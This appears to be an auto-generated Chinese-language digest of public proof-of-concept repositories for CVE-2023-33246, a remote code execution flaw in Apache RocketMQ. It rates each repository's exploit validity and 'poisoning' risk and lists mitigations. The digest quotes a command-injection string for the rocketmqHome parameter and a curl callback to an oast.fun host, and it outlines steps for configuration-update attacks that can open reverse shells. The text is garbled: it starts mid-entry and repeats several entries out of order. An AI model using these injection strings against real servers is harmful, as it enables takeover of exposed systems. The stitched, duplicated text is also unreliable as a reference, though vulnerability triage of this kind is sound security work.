3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
